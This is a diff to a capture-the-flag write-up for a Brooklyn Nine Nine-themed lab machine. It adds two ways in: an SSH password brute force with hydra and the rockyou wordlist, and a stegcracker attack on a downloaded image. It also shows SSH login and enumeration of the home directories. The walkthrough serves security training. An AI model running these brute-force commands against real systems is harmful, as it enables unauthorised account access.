@@ -43,8 +43,12 @@ Commands:
 `get note_to_jake.txt -`
   - print the contents of the text file
   - Amy tells jake to change his weak password because holt will be mad if someone hacks into the nine nine.
+
+ ### Two Ways Hack into the Machine
+
+ ---
  
-### SSH Brute Force
+### 1. SSH Brute Force
 Command: `hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.49.145.249`
 - `hydra` - a tool for brute-force attacks
 - `-l jake` - use only the username jake
@@ -56,21 +60,27 @@ Result:
 - password: `987***`
 - Hydra successfully brute-forced into Jake's account.
 
+### 2. Steganography Brute Force
+1. Download the cover image from the website: `wget http://10.49.145.249/brooklyn99.jpg`
+2. Crack the passphrase: `stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt`
+
+--- 
+
 ### SSH Login
 Commands: 
-`ssh jake@10.49.145.249`
+`ssh jake@10.49.145.249` or `ssh holt@10.49.145.249`
   - Type the password when prompted.
 `whoami`
-  - I am logged in as `jake`
+  - I am logged in as `jake`/`holt`
 `pwd`
-  - I am currently at `/home/jake`
-`ls`
-  - Jake's directory is empty
+  - I am currently at `/home/jake`/`/home/holt`
 
 ### Filesystem Enumeration
 Commands:
 `ls /home`
   - There are three user directories: `amy`, `holt`, and `jake`
+`ls /home/jake`
+  - Jake's directory is empty.
 `ls /home/amy`
   - Amy's directory is empty.
 `ls /home/holt`
